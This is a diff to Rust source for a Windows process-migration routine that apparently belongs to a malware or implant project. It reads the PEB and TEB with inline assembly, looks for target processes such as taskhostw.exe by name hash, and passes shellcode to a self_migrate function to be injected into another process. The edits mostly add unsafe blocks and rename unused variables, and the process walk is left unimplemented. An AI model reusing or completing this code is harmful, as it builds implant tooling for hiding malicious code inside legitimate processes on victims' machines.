@@ -14,22 +14,22 @@ const CANDIDATES: &[u32] = &[
     hashes::TASKHOSTW_EXE_HASH,
 ];
 
-unsafe fn get_own_session_id() -> u32 {
+unsafe fn get_own_session_id() -> u32 { unsafe {
     let peb: u64;
     core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
     if peb == 0 {
         return 0;
     }
     *((peb as usize + 0x2C0) as *const u32)
-}
+}}
 
-unsafe fn get_own_pid() -> usize {
+unsafe fn get_own_pid() -> usize { unsafe {
     let teb: u64;
     core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb); // TEB.ClientId is at offset 0x40, UniqueProcess is the first field (8 bytes on x64)
     *((teb as usize + 0x40) as *const usize)
-}
+}}
 
-unsafe fn free_memory(mut buffer: *mut c_void) {
+unsafe fn free_memory(mut buffer: *mut c_void) { unsafe {
     let mut free_size: usize = 0;
     nt::nt_allocate_virtual_memory(
         -1isize as HANDLE, 
@@ -39,11 +39,11 @@ unsafe fn free_memory(mut buffer: *mut c_void) {
         0x00008000, // MEM_RELEASE
         0
     );
-}
+}}
 
-unsafe fn find_processes_by_hash(target_hahs: u32, required_session: u32) -> [usize; 4] {
-    let mut result = [0usize; 4];
-    let mut count = 0usize;
+unsafe fn find_processes_by_hash(_target_hahs: u32, _required_session: u32) -> [usize; 4] { unsafe {
+    let result = [0usize; 4];
+    let _count = 0usize;
 
     // Allocate buffer for NtQuerySystemInformation(SystemProcessInfomration = 5)
     let mut buffer_size: u32 = 1024 * 256; // 256KB initial
@@ -51,7 +51,7 @@ unsafe fn find_processes_by_hash(target_hahs: u32, required_session: u32) -> [us
     let mut return_length: u32 = 0;
 
     // get our PID to avoid self injection
-    let out_pid = get_own_pid();
+    let _out_pid = get_own_pid();
 
     loop { 
         let mut size = buffer_size as usize;
@@ -88,9 +88,9 @@ unsafe fn find_processes_by_hash(target_hahs: u32, required_session: u32) -> [us
 
     // TODO: Walk the linked list of SYSTEM_PROCESS_INFORMATION
     unimplemented!()
-}
+}}
 
-pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool {
+pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
     if sehllcode.is_empty() {
         debug!("[MIGRATE] No Shellcode to inject");
         return false;
@@ -99,9 +99,9 @@ pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool {
     let our_session = get_own_session_id();
     for (idx, &hash) in CANDIDATES.iter().enumerate() {
         debug!("[MIGRATE] Trying target #{}", idx);
-        let pid = find_processes_by_hash(hash, our_session);
+        let _pid = find_processes_by_hash(hash, our_session);
     }
 
     true
-}
+}}
 
